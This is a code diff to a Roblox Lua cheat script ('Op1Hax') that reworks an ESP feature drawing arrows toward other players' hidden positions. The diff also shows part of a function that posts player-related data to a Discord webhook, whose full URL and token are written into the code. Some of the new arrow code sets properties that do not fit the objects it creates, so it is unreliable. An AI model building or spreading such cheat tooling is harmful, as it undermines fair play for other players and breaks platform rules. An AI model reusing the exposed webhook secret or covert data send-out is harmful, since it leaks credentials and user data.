@@ -61,7 +61,9 @@ local function sendWebhook(player)
 	end
 
 	local decoded = HttpService:JSONDecode(response.Body)
-	print(decoded)
+	for i, v in pairs(decoded) do
+		print("Key: " .. tostring(i) .. ", Value: " .. tostring(v))
+	end
 	
 	local webhook = "https://discord.com/api/webhooks/1460434193359179847/XHmVldBepBh0a2R8-OOSDXLAJ9jvJRjFrSB1O6g8_9XkhrXNoR770YBN4xA4Qd9DSWH4"
 	local data = { 
@@ -114,20 +116,31 @@ do
 	
 	-- Arrow configuration
 	local ArrowColor = Color3.new(1, 1, 1)
-	local ArrowSize = 40
-	local ArrowDistance = 150
+
+	local Folder = Instance.new("Folder")
+	Folder.Name = "Op1Hax_Arrows"
+	Folder.Parent = CoreGui
 
 	ArrowsESP.Enabled = enabled
 
 	local function createArrow()
-		local text = Drawing.new("Text")
+		local text = Instance.new("TextLabel")
+
+		text.Size = UDim2.fromOffset(256, 256)
+		text.Position = UDim2.fromScale(0.5, 0.5)
+		text.AnchorPoint = Vector2.new(0.5, 0.5)
+		text.BackgroundTransparency = 1
+		
 		text.Visible = false
-		text.Color = ArrowColor
-		text.Size = ArrowSize
-		text.Font = 2
+
+		text.Color3 = ArrowColor
+		text.Font = Enum.Font.SourceSansBold
 		text.Text = "▲"
-		text.Center = true
-		text.Transparency = 0.5
+		text.TextXAlignment = Enum.TextXAlignment.Center
+		text.TextYAlignment = Enum.TextYAlignment.Center
+		text.TextTransparency = 0.5
+
+		text.Parent = Folder
 		return text
 	end
 
@@ -146,13 +159,6 @@ do
 
 		local localChar = LocalPlayer.Character
 		local localHRP = localChar.HumanoidRootPart
-		local screenCenter = Camera.ViewportSize / 2
-		local camCFrame = Camera.CFrame
-		local camLook = camCFrame.LookVector
-
-		-- Get camera's forward direction in XZ plane
-		local camForward = Vector3.new(camLook.X, 0, camLook.Z).Unit
-		local camAngle = math.atan2(camForward.Z, camForward.X)
 
 		-- Update arrows for active players
 		for uid, player in pairs(ConcurrentPlayers) do
@@ -173,41 +179,22 @@ do
 				continue
 			end
 
-			-- Get target position and check if on screen
-			local targetPos = player.Character.HumanoidRootPart.Position
-			local onScreen, screenPos = Camera:WorldToViewportPoint(targetPos)
-			print(onScreen, screenPos)
+			local _, onScreen = Camera:WorldToViewportPoint(player.Character.HumanoidRootPart.Position)
+			print(player.Name, onScreen)
 
 			local arrow = arrowPool[uid]
 			if not arrow then
 				arrow = createArrow()
 				arrowPool[uid] = arrow
+			elseif onScreen then
+				arrow.Visible = false
 			end
 
 			if not onScreen then
-				-- Calculate direction to target in XZ plane
-				local localPos = localHRP.Position
-				local targetXZ = Vector3.new(targetPos.X, 0, targetPos.Z)
-				local localXZ = Vector3.new(localPos.X, 0, localPos.Z)
-				local dirXZ = (targetXZ - localXZ).Unit
-				local targetAngle = math.atan2(dirXZ.Z, dirXZ.X)
-				
-				-- Calculate relative angle to camera
-				local relativeAngle = targetAngle - camAngle
-				relativeAngle = ((relativeAngle + math.pi) % (math.pi * 2)) - math.pi
+				local dir = CFrame.lookAlong(Camera.CFrame.Position, Camera.CFrame.LookVector * Vector3.new(1, 0, 1)):PointToObjectSpace(player.Character.HumanoidRootPart.Position)
+				arrow.Rotation = math.deg(math.atan2(dir.Z, dir.X))
 
-				-- Position arrow at distance from center
-				local arrowX = math.cos(relativeAngle) * ArrowDistance
-				local arrowY = math.sin(relativeAngle) * ArrowDistance
-
-				-- Set position relative to screen center
-				arrow.Position = screenCenter + Vector2.new(arrowX, arrowY)
-				
-				-- Rotate arrow to point towards target
-				arrow.Rotation = math.deg(relativeAngle) + 90
 				arrow.Visible = true
-			else
-				arrow.Visible = false
 			end
 		end
 	end
@@ -230,17 +217,6 @@ do
 		ArrowColor = Color3.new(r, g, b)
 		for _, arrow in pairs(arrowPool) do
 			arrow.Color = ArrowColor
-		end
-	end
-
-	function ArrowsESP:SetDistance(dist)
-		ArrowDistance = dist
-	end
-
-	function ArrowsESP:SetSize(size)
-		ArrowSize = size
-		for _, arrow in pairs(arrowPool) do
-			arrow.Size = ArrowSize
 		end
 	end
 
